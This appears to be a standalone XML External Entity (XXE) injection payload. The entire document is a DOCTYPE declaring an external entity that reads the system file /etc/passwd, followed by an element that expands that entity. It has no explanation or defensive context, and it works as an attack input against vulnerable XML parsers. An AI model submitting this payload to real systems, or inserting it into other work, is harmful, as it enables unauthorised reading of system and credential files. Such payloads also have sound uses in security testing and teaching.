<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar SYSTEM
  "file:///etc/passwd">;
]>
<foo>
  &bar;
</foo>
